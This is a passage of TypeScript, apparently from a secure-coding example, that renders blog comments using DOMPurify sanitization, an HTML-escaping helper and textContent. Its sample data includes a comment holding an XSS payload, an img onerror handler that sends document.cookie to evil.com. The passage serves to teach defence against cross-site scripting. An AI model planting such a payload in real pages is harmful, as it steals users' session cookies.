    author: 'attacker',
    content:
      '<p>Nice post!</p>' +
      '<img src=x onerror="fetch(\'https://evil.com/steal?c=\' + document.cookie)">'
  }
];

function sanitizeHtml(untrustedHtml: string): string {
  // PRIMARY DEFENSE: HTML sanitization with DOMPurify
  const sanitized = DOMPurify.sanitize(untrustedHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href']
  });
  return sanitized;
}

function escapeText(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderCommentsSecure(comments: Comment[]): void {
  if (!commentsContainer) {
    console.error('comments-secure container not found');
    return;
  }

  commentsContainer.innerHTML = '';

  comments.forEach((comment) => {
    const wrapper = document.createElement('article');
    wrapper.className = 'comment';

    const authorEl = document.createElement('h4');
    // SECONDARY DEFENSE: Use textContent for plain text
    authorEl.textContent = comment.author;

    const contentEl = document.createElement('div');
    contentEl.className = 'content';

    try {
      const sanitizedHtml = sanitizeHtml(comment.content);
      // Safe: sanitized HTML from DOMPurify
      contentEl.innerHTML = sanitizedHtml;
    } catch (e) {
      console.error('Failed to sanitize comment content', e);
